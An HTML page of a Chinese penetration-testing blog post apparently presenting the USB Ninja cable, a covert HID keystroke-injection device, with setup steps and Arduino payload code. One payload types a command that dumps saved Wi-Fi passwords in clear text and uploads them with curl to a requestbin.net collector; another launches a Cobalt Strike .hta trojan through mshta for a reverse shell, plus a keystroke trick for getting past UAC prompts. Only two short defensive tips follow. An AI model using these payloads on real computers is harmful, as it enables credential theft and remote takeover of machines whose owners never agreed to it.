@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sunian19.github.io","root":"/","scheme":"Gemini","version":"7.7.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="USB ninja 翻译过来就是USB忍者，算是badusb的一种，属于HID攻击设备。在那之前我们先了解下什么是HID攻击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="&#39;黑客近源渗透利器之USB ninja&#39;">
+<meta property="og:url" content="https://sunian19.github.io/2020/04/30/USBninja/index.html">
+<meta property="og:site_name" content="Sunian&#39;s Blog">
+<meta property="og:description" content="USB ninja 翻译过来就是USB忍者，算是badusb的一种，属于HID攻击设备。在那之前我们先了解下什么是HID攻击">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p65.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p66.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p67.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p68.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p69.jpg">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p70.jpg">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p71.jpg">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p72.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p73.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p74.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p100.jpg">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p79.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p75.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p77.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p78.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/p76.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/111.png">
+<meta property="article:published_time" content="2020-04-29T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-08-14T15:10:34.569Z">
+<meta property="article:author" content="素念">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="badusb">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sunian19.github.io/imgss/p65.png">
+
+<link rel="canonical" href="https://sunian19.github.io/2020/04/30/USBninja/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>'黑客近源渗透利器之USB ninja' | Sunian's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?d70c2fd321d2281d853a9197812a8f28";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <a target="_blank" rel="noopener" href="https://github.com/sunian19" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#70B7FD; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sunian's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sunian19.github.io/2020/04/30/USBninja/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/imgss/touxiang.jpg">
+      <meta itemprop="name" content="素念">
+      <meta itemprop="description" content="忘川河畔彼岸花，红如鲜血似朱砂">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sunian's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          '黑客近源渗透利器之USB ninja'
+        </h1>
+
+        <div class="post-meta">
+        
+    <i class="fa fa-thumb-tack"></i>
+    <font color="green">置顶</font>
+    <span class="post-meta-divider">|</span>
+
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-30 00:00:00" itemprop="dateCreated datePublished" datetime="2020-04-30T00:00:00+08:00">2020-04-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-08-14 23:10:34" itemprop="dateModified" datetime="2020-08-14T23:10:34+08:00">2020-08-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>USB ninja 翻译过来就是USB忍者，算是badusb的一种，属于HID攻击设备。在那之前我们先了解下什么是HID攻击</p>
+<a id="more"></a>
+
+<h3 id="HID攻击原理"><a href="#HID攻击原理" class="headerlink" title="HID攻击原理"></a>HID攻击原理</h3><p>HID是Human Interface Device的缩写，由其名称可以了解HID设备是直接与人交互的设备。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。简而言之，今天要介绍的usb ninja利用的是虚拟键盘来实现恶意代码的执行，而它与badusb不同的是，它把代码隐藏在数据线中，更具有迷惑性。</p>
+<h3 id="介绍一下常见HID设备"><a href="#介绍一下常见HID设备" class="headerlink" title="介绍一下常见HID设备"></a>介绍一下常见HID设备</h3><p><img src="/imgss/p65.png" alt="大黄鸭"><br><img src="/imgss/p66.png" alt="树莓派zero W"><br><img src="/imgss/p67.png" alt="WHID"><br><img src="/imgss/p68.png" alt="USB ninja"></p>
+<h3 id="设备介绍"><a href="#设备介绍" class="headerlink" title="设备介绍"></a>设备介绍</h3><p>拿到手之后，里面有以下几样东西<br>1、数据线(我要了type-C的接口，因为现在手机主流都是type-C)<br>2、外壳<br>3、天线<br>4、触发代码上传机制的磁铁<br>5、主板<br><img src="/imgss/p69.jpg"></p>
+<h3 id="电池介绍"><a href="#电池介绍" class="headerlink" title="电池介绍"></a>电池介绍</h3><p>使用为LIR2032 3.7V可充电电池，而还有一种电池与它相似CR2032 3V一次性电池<br>当我们的可充电电池寿命用尽时，请去五金店购买LIR2032，切记不要买错，因为给CR2032充电可能会发生爆炸(切记)<br><img src="/imgss/p70.jpg"><br>组装没啥难度，直接把外壳用螺丝刀拧上就行了<br><img src="/imgss/p71.jpg"></p>
+<h3 id="软件介绍"><a href="#软件介绍" class="headerlink" title="软件介绍"></a>软件介绍</h3><p>使用Arduino 进行编写代码，下载链接如下<br><a target="_blank" rel="noopener" href="https://share.weiyun.com/5aNlfTg">https://share.weiyun.com/5aNlfTg</a></p>
+<h3 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h3><p>Arduino IDE中使用的开发语言是C，一个程序在Arduino IDE中被成为 sketch，每个 sketch 都包含一个 setup 函数和一个 loop 函数。程序启动，首先调用 setup，这个函<br>数只被调用一次，loop 函数会被不停的重复调用下去。</p>
+<h3 id="软件设置"><a href="#软件设置" class="headerlink" title="软件设置"></a>软件设置</h3><p>点击文件，首选项，进行设置开发板管理器<br><a target="_blank" rel="noopener" href="http://usbninja.com/arduino/package_USBNinja_index.json">http://usbninja.com/arduino/package_USBNinja_index.json</a><br><img src="/imgss/p72.png"><br>设置完成后，点击工具，开发板管理，进行加载管理器，需VPN，然后拉到最下面，有个USB ninja进行安装<br><img src="/imgss/p73.png"><br><img src="/imgss/p74.png"><br>烧录时开发板选择USB Ninja cable(BLE+Hall sensor)</p>
+<h3 id="代码示例与演示"><a href="#代码示例与演示" class="headerlink" title="代码示例与演示"></a>代码示例与演示</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;NinjaKeyboard.h&gt;</span><br><span class="line"></span><br><span class="line">void setup()</span><br><span class="line">&#123;</span><br><span class="line">  &#x2F;&#x2F;SetRunOnce(PAYLOADA,true);</span><br><span class="line">  &#x2F;&#x2F;SetRunOnce(PAYLOADB,true);</span><br><span class="line">  &#x2F;&#x2F;If you want payload to run only once, run this function.  </span><br><span class="line">&#125;</span><br><span class="line">                &#x2F;&#x2F;</span><br><span class="line">void loop() &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">When the Bluetooth remote control button A is pressed.</span><br><span class="line">The program in payloadA() will be executed in a loop.</span><br><span class="line">Until the button A is released.</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void payloadA()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    USBninjaOnline(); </span><br><span class="line">    NinjaKeyboard.begin(); </span><br><span class="line">    NinjaKeyboard.delay(1000);  </span><br><span class="line">    NinjaKeyboard.sendKeyStroke(0);</span><br><span class="line">    NinjaKeyboard.delay(1000); </span><br><span class="line">    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); </span><br><span class="line">    NinjaKeyboard.delay(200);</span><br><span class="line">    NinjaKeyboard.print(F(&quot;cmd&quot;));</span><br><span class="line">    NinjaKeyboard.sendKeyStroke(KEY_ENTER); </span><br><span class="line">    NinjaKeyboard.delay(1000);</span><br><span class="line">    NinjaKeyboard.println(&quot;netsh wlan export profile key&#x3D;clear &amp;&amp; type *.xml &gt;666.txt &amp;&amp; curl http:&#x2F;&#x2F;requestbin.net&#x2F;r&#x2F;12zzzzz1 -F file&#x3D;@666.txt &amp;&amp; exit&quot;);  &#x2F;&#x2F;获取WIFI信息，平台使用的http:&#x2F;&#x2F;requestbin.net相当于ceye平台数据外带</span><br><span class="line">    NinjaKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);      </span><br><span class="line">    NinjaKeyboard.delay(100); </span><br><span class="line">    NinjaKeyboard.sendKeyStroke(KEY_ENTER); </span><br><span class="line">    NinjaKeyboard.delay(100); </span><br><span class="line">    NinjaKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);      </span><br><span class="line">    NinjaKeyboard.delay(100); </span><br><span class="line">    NinjaKeyboard.end();   </span><br><span class="line">    USBninjaOffline();  </span><br><span class="line">    NinjaKeyboard.begin();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void payloadB()</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    USBninjaOnline();</span><br><span class="line">    NinjaKeyboard.begin();</span><br><span class="line">    NinjaKeyboard.delay(1000);  </span><br><span class="line">    NinjaKeyboard.sendKeyStroke(0);</span><br><span class="line">    NinjaKeyboard.delay(1000);</span><br><span class="line">    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);   &#x2F;&#x2F;按下win键+R键</span><br><span class="line">    NinjaKeyboard.delay(100);  </span><br><span class="line">    NinjaKeyboard.println(&quot;mshta.exe http:&#x2F;&#x2F;127.0.0.1&#x2F;1.hta&quot;);       &#x2F;&#x2F;运行CS木马反弹shell</span><br><span class="line">    NinjaKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);      </span><br><span class="line">    NinjaKeyboard.delay(100);</span><br><span class="line">    NinjaKeyboard.sendKeyStroke(KEY_ENTER);    &#x2F;&#x2F;回车</span><br><span class="line">    NinjaKeyboard.delay(100);</span><br><span class="line">    NinjaKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">    NinjaKeyboard.delay(500);</span><br><span class="line">    NinjaKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);</span><br><span class="line">    NinjaKeyboard.delay(100);</span><br><span class="line">    NinjaKeyboard.end();   </span><br><span class="line">    USBninjaOffline();  </span><br><span class="line">    NinjaKeyboard.begin();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>验证完代码之后，进行上传，会提示插入数据线</p>
+<blockquote>
+<p>/&gt;Please plug in the USBNinja device … </p>
+</blockquote>
+<p><img src="/imgss/p100.jpg" alt="插入姿势"></p>
+<h4 id="1、paylaodA"><a href="#1、paylaodA" class="headerlink" title="1、paylaodA"></a>1、paylaodA</h4><p>获取WIFI信息，使用平台<a target="_blank" rel="noopener" href="http://requestbin.net/">http://requestbin.net</a><br>执行之后获得目标机的WIFI信息，在平台进行查看<br>name为WIFI的名字<br>protected为密码是否加密<br>KeyMaterial为密码<br>在测试的时候只发现一个明文密码，可正常连接该WIFI，其他都为加密密码。<br><img src="/imgss/p79.png"></p>
+<h4 id="2、payloadB"><a href="#2、payloadB" class="headerlink" title="2、payloadB"></a>2、payloadB</h4><p>使用CS生成.hta结尾的木马<br><img src="/imgss/p75.png"><br><img src="/imgss/p77.png"><br>按下A按钮，执行payloadB，反弹shell<br><img src="/imgss/p78.png"></p>
+<h3 id="UAC绕过-badusb也可使用"><a href="#UAC绕过-badusb也可使用" class="headerlink" title="UAC绕过(badusb也可使用)"></a>UAC绕过(badusb也可使用)</h3><p>看到网上好多说用模拟点击进行绕过的，其实不用那么麻烦。<br>直接可以使用Alt+y绕过UAC，在执行HID攻击时我们需要使用管理员的权限可执行ctrl+shift+enter。</p>
+<h3 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h3><p>1、不使用未知来源的U盘，数据线等与电脑交互的设备。<br>2、使用转接器，如下图所示<br><img src="/imgss/p76.png"></p>
+<h2 id="加入知识星球获取更多渗透资料"><a href="#加入知识星球获取更多渗透资料" class="headerlink" title="加入知识星球获取更多渗透资料"></a>加入知识星球获取更多渗透资料</h2><p><img src="/imgss/111.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/badusb/" rel="tag"># badusb</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/13/upload-labs/" rel="prev" title="'upload靶场通关(利用python脚本)'">
+      <i class="fa fa-chevron-left"></i> 'upload靶场通关(利用python脚本)'
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/05/07/OSINT%E6%8C%87%E5%8D%97/" rel="next" title="'OSINT 指南'">
+      'OSINT 指南' <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#HID%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">HID攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8B%E5%B8%B8%E8%A7%81HID%E8%AE%BE%E5%A4%87"><span class="nav-number">2.</span> <span class="nav-text">介绍一下常见HID设备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BE%E5%A4%87%E4%BB%8B%E7%BB%8D"><span class="nav-number">3.</span> <span class="nav-text">设备介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%B5%E6%B1%A0%E4%BB%8B%E7%BB%8D"><span class="nav-number">4.</span> <span class="nav-text">电池介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AF%E4%BB%B6%E4%BB%8B%E7%BB%8D"><span class="nav-number">5.</span> <span class="nav-text">软件介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D"><span class="nav-number">6.</span> <span class="nav-text">函数介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AF%E4%BB%B6%E8%AE%BE%E7%BD%AE"><span class="nav-number">7.</span> <span class="nav-text">软件设置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E4%B8%8E%E6%BC%94%E7%A4%BA"><span class="nav-number">8.</span> <span class="nav-text">代码示例与演示</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81paylaodA"><span class="nav-number">8.1.</span> <span class="nav-text">1、paylaodA</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81payloadB"><span class="nav-number">8.2.</span> <span class="nav-text">2、payloadB</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UAC%E7%BB%95%E8%BF%87-badusb%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8"><span class="nav-number">9.</span> <span class="nav-text">UAC绕过(badusb也可使用)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5"><span class="nav-number">10.</span> <span class="nav-text">防御手段</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E5%85%A5%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E8%8E%B7%E5%8F%96%E6%9B%B4%E5%A4%9A%E6%B8%97%E9%80%8F%E8%B5%84%E6%96%99"><span class="nav-number"></span> <span class="nav-text">加入知识星球获取更多渗透资料</span></a></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="素念"
+      src="/imgss/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">素念</p>
+  <div class="site-description" itemprop="description">忘川河畔彼岸花，红如鲜血似朱砂</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">77</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:lingyu195@gmail.com" title="E-Mail → mailto:lingyu195@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=3504078815" title="QQ → tencent:&#x2F;&#x2F;AddContact&#x2F;?fromId&#x3D;45&amp;fromSubId&#x3D;1&amp;subcmd&#x3D;all&amp;uin&#x3D;3504078815" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://wp.fmk.pub/" title="http:&#x2F;&#x2F;wp.fmk.pub&#x2F;" rel="noopener" target="_blank">Defender</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.ch4ser.top/" title="http:&#x2F;&#x2F;www.ch4ser.top&#x2F;" rel="noopener" target="_blank">ch4ser</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://hackergu.com/" title="http:&#x2F;&#x2F;hackergu.com&#x2F;" rel="noopener" target="_blank">Gu</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://al0neranger.github.io/" title="https:&#x2F;&#x2F;al0neranger.github.io&#x2F;" rel="noopener" target="_blank">al0neranger</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
